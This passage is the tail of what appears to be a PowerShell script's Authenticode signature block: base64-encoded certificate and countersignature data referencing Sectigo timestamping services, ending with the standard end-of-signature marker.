# cWWCvJ/8i7u7lZj7JRGOWogJZhEUWLK6Ilvm9jLxXS3AeqIO4OBWZO2h5YEgciBk
# QWzHwwj6831d7yGawn7XLMO6EZge/NMgCEKzX79/iFgyqzCz2Ix6lkoZE1ys/Oer
# 6RwWLrCwOJVKz4VQq2cDJaG7OOkPb6lampEoEzW5H/M94STIa7GZ6A3vu03lPYxU
# A5HQ/C3PVTM4egkcB9Ei4GOGp7790oNzEhSbmkwJRr00vOFLUHty4Fv9GbsfPGoZ
# e267LUQqvjxMzKyKBJPGV4agczYrgZf6G5t+iIfYUnmJ/m53N9e7UJ/6GCVPE/Je
# fKmxIFopq6NCh3fg9EwCSN1YpVOmo6DtGZZlFSnF7TMwJeaWg4Ga9mBmkFgHgM1C
# daz7tJHQxd0BQGq2qBDu9o16t551r9OlSxihDJ9XsF4lR5F0zXUS0Zxv5F4Nm+x1
# Ju7+0/WSL1KF6NpEUSqizADKh2ZDoxsA76K1lp1irScL8htKycOUQjeIIISoh67D
# uiNye/hU7/hrJ7CF9adDhdgrOXTbWncC0aT69c2cPcwfrlHQe2zYHS0RQlNxdMLl
# NaotUhLZJc/w09CRQxLXMn2YbON3Qcj/HyRU726txj5Ve/Fchzpk8WBLBU/vuS/s
# CRMCAwEAAaOCAYIwggF+MB8GA1UdIwQYMBaAFBqh+GEZIA/DQXdFKI7RNV8GEgRV
# MB0GA1UdDgQWBBQDDzHIkSqTvWPz0V1NpDQP0pUBGDAOBgNVHQ8BAf8EBAMCBsAw
# DAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBKBgNVHSAEQzBB
# MDUGDCsGAQQBsjEBAgEDCDAlMCMGCCsGAQUFBwIBFhdodHRwczovL3NlY3RpZ28u
# Y29tL0NQUzAIBgZngQwBBAIwRAYDVR0fBD0wOzA5oDegNYYzaHR0cDovL2NybC5z
# ZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3JsMHQGCCsGAQUF
# BwEBBGgwZjA/BggrBgEFBQcwAoYzaHR0cDovL2NydC5zZWN0aWdvLmNvbS9TZWN0
# aWdvUlNBVGltZVN0YW1waW5nQ0EuY3J0MCMGCCsGAQUFBzABhhdodHRwOi8vb2Nz
# cC5zZWN0aWdvLmNvbTANBgkqhkiG9w0BAQwFAAOCAgEATJtlWPrgec/vFcMybd4z
# ket3WOLrvctKPHXefpRtwyLHBJXfZWlhEwz2DJ71iSBewYfHAyTKx6XwJt/4+DFl
# DeDrbVFXpoyEUghGHCrC3vLaikXzvvf2LsR+7fjtaL96VkjpYeWaOXe8vrqRZIh1
# /12FFjQn0inL/+0t2v++kwzsbaINzMPxbr0hkRojAFKtl9RieCqEeajXPawhj3DD
# JHk6l/ENo6NbU9irALpY+zWAT18ocWwZXsKDcpCu4MbY8pn76rSSZXwHfDVEHa1Y
# GGti+95sxAqpbNMhRnDcL411TCPCQdB6ljvDS93NkiZ0dlw3oJoknk5fTtOPD+UT
# T1lEZUtDZM9I+GdnuU2/zA2xOjDQoT1IrXpl5Ozf4AHwsypKOazBpPmpfTXQMkCg
# sRkqGCGyyH0FcRpLJzaq4Jgcg3Xnx35LhEPNQ/uQl3YqEqxAwXBbmQpA+oBtlGF7
# yG65yGdnJFxQjQEg3gf3AdT4LhHNnYPl+MolHEQ9J+WwhkcqCxuEdn17aE+Nt/cT
# tO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+yFUK7SnD
# H944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJanwrCKNI
# 9RX8BE/fzSEceuX1jhrUuUAxggUbMIIFFwIBATArMBcxFTATBgNVBAMMDEtET1Qg
# Um9vdCBDQQIQNZ2siXh+aIFO470KIbV4ADAJBgUrDgMCGgUAoHgwGAYKKwYBBAGC
# NwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUgP7uox5T
# UUZqERcehtt0poY73gkwDQYJKoZIhvcNAQEBBQAEggEADSdeRQ0LYuu55jsa/VoT
# rql6o5C+/2VV7vnsJOzZx+y7b/CMeO4jv9JVw2J42b4gRYy27C40qFc04PhrWgxr
# PGfO1GY2XUoqdue2ZUwwLKbaxeW6gX9cCpzWtwTOjOt7vndBwnvqDdbGAJd0uy5u
# QJGbPvUZ3CNuCV2EIMk0mOSeRb1VJBvPCYoGaYXR/81DbXYw+tRC28u5LTuIsTuB
# Axn5vSmkzOuk4EdkCHUvOWcv2v0uOGeNSqmISMbQB/ZpeVshPHyz6o4A2wJOQqis
# voarrWS2a1gG+4EoIXHoMKrOy86uVGgUuwanBai8vpoPWsP/0PAfj6vjN+/xkU7A
# aqGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJH
# QjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3Jk
# MRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNB
# IFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAIC
# BQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0y
# NDA0MjUxODM1MDhaMD8GCSqGSIb3DQEJBDEyBDANa3PiG6ua+nR+EFgIegwtx03L
# GO92rZkGIHOz6ZuqbCEPSOzO5Z0mkwbe7fvBqRYwDQYJKoZIhvcNAQEBBQAEggIA
# pFvRS8WgXT8dr916OkrRO6GNLr2NMxU5D+huizBvYhXj9FG6SxGEboxUNLg/wveu
# 2jxZnXdU3D236W1rNOi8o4AzNiTb/LujOirpIUmaunEiLiRR7QVxvhIY7xMNd3qH
# 04G6ASBOJWMpOzO2pc8l6l8d+YlvELToGi4sv6pjsSSP3njiSQJkymNYfnY5Xfvi
# t8JlpeoVUgdy9iWyeFrR/7mpzvtMwQ5GQUqPqFrTAMsm+gR8NKAoDtZkL6FFST6z
# 1tgxxD4ERnwoB759xZbEjxgHNAqFkL1eqeQP9I/5eiixVytmyLR2oRKAx8hc+MfB
# uebMM1FAktLH4DxYibcn/mmWk51XSrq3ypELlelrKfAdmA+rhlwAFYw+iFFZloVl
# csGPeVmBkW91ah5TAjRFHPY1CqMy9WaPhvUeJgGNilIo90hbsK+csLxkrfXCYNDW
# pSBoOCoa2w7vOoHeLjpWiytiS6l3YIW3uR5/9P0GG6UXQeT73p1GiI5qwNfPMLEq
# 0Qb+BIYJrnviVXfdhOqMdB07TwUzHsg5NtXph/fYP0zHGKth/o010uV1OKdIGSX+
# dTBG8Hb6ffZPXgnBD8+kIjhgLyqkU0uoU3ObozQfjQm6YXnmAUvSsK4iVA02K/ar
# I1mHPapQzdsgXUQGBa4QldcfN87aELvRsjTva+eLGBg=
# SIG # End signature block
